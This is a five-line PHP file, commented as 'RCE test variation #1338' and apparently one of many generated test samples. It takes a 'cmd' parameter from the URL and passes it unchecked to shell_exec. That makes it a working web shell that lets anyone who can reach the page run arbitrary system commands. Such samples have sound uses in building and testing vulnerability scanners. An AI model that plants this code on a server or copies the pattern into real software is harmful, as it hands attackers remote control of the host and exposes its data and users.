<?php
// RCE test variation #1338
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>